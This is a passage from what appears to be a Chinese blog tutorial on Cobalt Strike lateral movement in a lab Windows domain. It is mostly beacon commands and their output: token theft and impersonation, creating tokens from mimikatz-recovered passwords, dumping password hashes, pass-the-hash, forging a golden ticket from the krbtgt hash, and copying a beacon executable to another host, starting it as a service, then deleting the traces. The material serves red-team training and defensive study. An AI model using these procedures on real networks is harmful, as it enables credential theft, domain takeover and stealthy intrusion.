<p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>

<p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">ps</span></span><br><span class="line">[*] Tasked beacon to list processes</span><br><span class="line">[+] host called home, sent: <span class="number">12</span> bytes</span><br><span class="line">[*] <span class="keyword">Process</span> List</span><br><span class="line"> PID   PPID  Name                         Arch  Session     User</span><br><span class="line"> <span class="literal">---</span>   <span class="literal">----</span>  <span class="literal">----</span>                         <span class="literal">----</span>  <span class="literal">-------</span>     <span class="literal">-----</span></span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [<span class="type">System</span> <span class="type">Process</span>]                               </span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                       x64   <span class="number">0</span>           NT AUTHORITY\SYSTEM</span><br><span class="line">……内容太多，此处省略……</span><br><span class="line"> <span class="number">3720</span>  <span class="number">524</span>   taskhost.exe                 x64   <span class="number">2</span>           WIN<span class="literal">-72A8ERDSF2P</span>\Administrator</span><br><span class="line"> <span class="number">4092</span>  <span class="number">236</span>   dwm.exe                      x64   <span class="number">3</span>           TEAMSSIX\Administrator</span><br></pre></td></tr></table></figure>

<p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; steal_token <span class="number">4092</span></span><br><span class="line">[*] Tasked beacon to steal token from PID <span class="number">4092</span></span><br><span class="line">[+] host called home, sent: <span class="number">12</span> bytes</span><br><span class="line">[+] Impersonated TEAMSSIX\administrator</span><br></pre></td></tr></table></figure>

<p>查看一下当前会话 uid</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br><span class="line">[*] You are TEAMSSIX\administrator (admin)</span><br></pre></td></tr></table></figure>

<p>再次尝试获取域控制器主机下的文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件      <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">4</span> 个目录 <span class="number">28</span>,<span class="number">493</span>,<span class="number">299</span>,<span class="number">712</span> 可用字节</span><br></pre></td></tr></table></figure>

<p>发现可以成功访问了，使用 <code>rev2self</code> 可移除当前窃取的令牌</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure>

<p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: <span class="number">8</span> bytes</span><br><span class="line">[*] You are NT AUTHORITY\SYSTEM (admin)</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>



<p><strong>凭证</strong> </p>
<p>1、使用 make_token 创建一个令牌</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token DOMAIN\user password</span><br></pre></td></tr></table></figure>

<p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a target="_blank" rel="noopener" href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍</p>
<p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; make_token TEAMSSIX\administrator Test111!</span><br><span class="line">[*] Tasked beacon to create a token <span class="keyword">for</span> TEAMSSIX\administrator</span><br><span class="line">[+] host called home, sent: <span class="number">53</span> bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WIN<span class="literal">-P2AASSD1AF1</span>\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件      <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">4</span> 个目录 <span class="number">28</span>,<span class="number">493</span>,<span class="number">299</span>,<span class="number">712</span> 可用字节</span><br><span class="line">               </span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WIN<span class="literal">-P2AASSD1AF1</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WIN<span class="literal">-P2AASSD1AF1</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">231</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">teamssix\administrator</span><br></pre></td></tr></table></figure>

<p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p>
<p>2、使用 spawn beacon 替代凭证</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawnas DOMAIN\user password</span><br></pre></td></tr></table></figure>

<p>3、在目标上建立账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\host\C<span class="variable">$</span>/USER:DOMAIN\user password</span><br></pre></td></tr></table></figure>

<p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p>
<p><strong>密码哈希</strong> </p>
<p>使用 mimikatz 获取密码哈希</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth DOMAIN\user ntlmhash</span><br></pre></td></tr></table></figure>

<p>如何工作的？</p>
<p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p>
<p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p>
<p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: <span class="number">82501</span> bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:<span class="number">500</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Daniel:<span class="number">1000</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Guest:<span class="number">501</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TeamsSix:<span class="number">1002</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br></pre></td></tr></table></figure>

<p>使用 <code>pth</code> 获取信任</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; pth TEAMSSIX\Administrator <span class="number">12</span>cb161bvca930994x00cbc0aczf06d1</span><br><span class="line">[+] host called home, sent: <span class="number">23</span> bytes</span><br><span class="line">[*] Tasked beacon to run mimikatz<span class="string">&#x27;s sekurlsa::pth /user:Administrator /domain:TEAMSSIX /ntlm:12cb161bvca930994x00cbc0aczf06d1 /run:&quot;%COMSPEC% /c echo ade660d8dce &gt; \\.\pipe\8d3e4c&quot; command</span></span><br><span class="line"><span class="string">[+] host called home, sent: 750600 bytes</span></span><br><span class="line"><span class="string">[+] host called home, sent: 71 bytes</span></span><br><span class="line"><span class="string">[+] Impersonated NT AUTHORITY\SYSTEM</span></span><br><span class="line"><span class="string">[+] received output:</span></span><br><span class="line"><span class="string">user	: Administrator</span></span><br><span class="line"><span class="string">domain	: TEAMSSIX</span></span><br><span class="line"><span class="string">program	: C:\Windows\system32\cmd.exe /c echo ade660d8dce &gt; \\.\pipe\8d3e4c</span></span><br><span class="line"><span class="string">impers.	: no</span></span><br><span class="line"><span class="string">NTLM	: 12cb161bvca930994x00cbc0aczf06d1</span></span><br><span class="line"><span class="string">  |  PID  2992</span></span><br><span class="line"><span class="string">  |  TID  5028</span></span><br><span class="line"><span class="string">  |  LSA Process is now R/W</span></span><br><span class="line"><span class="string">  |  LUID 0 ; 14812112 (00000000:00e203d0)</span></span><br><span class="line"><span class="string">  \_ msv1_0   - data copy @ 0000000001794E80 : OK !</span></span><br><span class="line"><span class="string">  \_ kerberos - data copy @ 000000000044A188</span></span><br><span class="line"><span class="string">   \_ aes256_hmac       -&gt; null             </span></span><br><span class="line"><span class="string">   \_ aes128_hmac       -&gt; null             </span></span><br><span class="line"><span class="string">   \_ rc4_hmac_nt       OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_old      OK</span></span><br><span class="line"><span class="string">   \_ rc4_md4           OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_nt_exp   OK</span></span><br><span class="line"><span class="string">   \_ rc4_hmac_old_exp  OK</span></span><br><span class="line"><span class="string">   \_ *Password replace @ 00000000017DA1E8 (16) -&gt; null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">beacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;</span></span><br><span class="line"><span class="string">[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;</span></span><br><span class="line"><span class="string">[+] host called home, sent: 231 bytes</span></span><br><span class="line"><span class="string">[+] received output:</span></span><br><span class="line"><span class="string">teamssix\administrator</span></span><br></pre></td></tr></table></figure>



<h6 id="Kerberos-票据"><a href="#Kerberos-票据" class="headerlink" title="Kerberos 票据"></a>Kerberos 票据</h6><p>关于 Kerberos 的介绍： <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p>
<p>查看有哪些 Kerberos 票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell klist</span><br></pre></td></tr></table></figure>

<p>除去 kerberos 票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure>

<p>加载 kerberos 票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use [/<span class="type">path</span>/<span class="type">to</span>/<span class="type">file.ticket</span>]</span><br></pre></td></tr></table></figure>



<h6 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h6><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p>
<p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p>
<p><strong>1、目标的用户名及域名</strong></p>
<p><strong>2、域的 SID 值</strong></p>
<p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell whoami /user</span><br><span class="line">[*] Tasked beacon to run: whoami /user</span><br><span class="line">[+] host called home, sent: <span class="number">43</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">用户信息</span><br><span class="line"><span class="literal">----------------</span></span><br><span class="line">用户名        SID                                         </span><br><span class="line">============= ============================================</span><br><span class="line">teamssix\daniel S<span class="literal">-1-5-21-5311978431-183514165-284342044-1000</span></span><br></pre></td></tr></table></figure>

<p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p>
<p><strong>3、DC 中 KRBTGT 用户的 NTLM 哈希</strong></p>
<p>DC 中 KRBTGT 用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: <span class="number">82501</span> bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:<span class="number">500</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br><span class="line">Guest:<span class="number">501</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:<span class="number">502</span>:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::</span><br><span class="line">daniel:<span class="number">1108</span>:aca3b435b5z404eeaad3f435b51404he:<span class="number">12</span>cb161bvca930994x00cbc0aczf06d1:::</span><br></pre></td></tr></table></figure>

<p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面</p>
<p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式</p>
<p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WinDC <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-computer</span> WinDC <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">203</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">teamssix\administrator</span><br></pre></td></tr></table></figure>



<h6 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h6><p>实现代码执行的四个步骤：</p>
<p>1、与目标建立信任关系</p>
<p>2、复制可执行文件到目标上</p>
<p>3、在目标上运行可执行文件</p>
<p>4、实现对目标的控制</p>
<p>个人感觉其实这一节叫<code>横向移动的方法</code>更为合适</p>
<p><strong>创建可执行文件</strong></p>
<p>创建可执行文件可以在 Cobalt Strike 的 <code>Attack -&gt; Packages -&gt; Windows Executable(s)</code> 处进行创建</p>
<p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的</p>
<p><strong>上传可执行文件</strong></p>
<p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> file.exe \\host\C<span class="variable">$</span>\Windows\Temp</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; upload /root/beacon.exe</span><br><span class="line">[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">289302</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">copy</span> beacon.exe \\WinTest\C<span class="variable">$</span>\Windows\Temp</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">copy</span> beacon.exe \\WinTest\C<span class="variable">$</span>\Windows\Temp</span><br><span class="line">[+] host called home, sent: <span class="number">72</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">已复制<span class="number">1</span> 个文件。</span><br></pre></td></tr></table></figure>

<p><strong>执行文件（方法一）</strong></p>
<p>1、生成 Windows Service EXE 并上传</p>
<p>2、在目标主机上创建一个服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">sc</span> \\host create name binpath= c:\windows\temp\file.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">93</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[<span class="type">SC</span>] CreateService 成功</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：记住 binpath 路径</p>
</blockquote>
<p>3、在目标主机上启动服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">sc</span> \\host <span class="built_in">start</span> name</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest <span class="built_in">start</span> beacon</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest <span class="built_in">start</span> beacon</span><br><span class="line">[+] host called home, sent: <span class="number">56</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">SERVICE_NAME: beacon </span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7d0</span><br><span class="line">        PID                : <span class="number">3816</span></span><br><span class="line">        FLAGS              : </span><br><span class="line">        </span><br><span class="line">beacon&gt; link wintest</span><br><span class="line">[*] Tasked to link to \\wintest\pipe\msagent_da00</span><br><span class="line">[+] host called home, sent: <span class="number">36</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">175.130</span></span><br></pre></td></tr></table></figure>

<p>4、清除痕迹与服务</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\host delete name</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">del</span> beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">del</span> beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">57</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">del</span> \\wintest\C<span class="variable">$</span>\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">del</span> \\wintest\C<span class="variable">$</span>\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">83</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest delete beacon</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest delete beacon</span><br><span class="line">[+] host called home, sent: <span class="number">69</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[<span class="type">SC</span>] DeleteService 成功</span><br></pre></td></tr></table></figure>

<p><strong>执行文件（方法二）</strong></p>
<p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code>Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p>
<p>2、找到目标系统上的时间</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net time \\host</span><br></pre></td></tr></table></figure>

